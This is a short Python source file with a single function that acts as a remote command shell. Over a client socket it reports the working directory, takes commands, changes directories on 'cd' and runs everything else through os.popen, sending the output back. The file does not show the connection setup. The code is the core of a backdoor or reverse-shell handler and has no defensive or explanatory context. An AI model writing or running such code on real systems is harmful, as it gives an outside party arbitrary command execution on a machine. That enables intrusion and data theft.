import os
import sys
import time


def shell(client):
    while True:
        dir = os.getcwd()
        print(dir)
        client.send(dir.encode())
        cmd = client.recv(1024).decode()
        if cmd == "exit":
            client.send("Connection closed".encode())
            break
        elif cmd.startswith("cd"):
            os.chdir(cmd[2:].strip())
            result = "Directory changed successful"
        else:
            result = os.popen(cmd).read()
            result = result.replace('\n', '\r\n')
        if not result:
            result = "Command processed successful"

        client.send(result.encode())
        time.sleep(1)
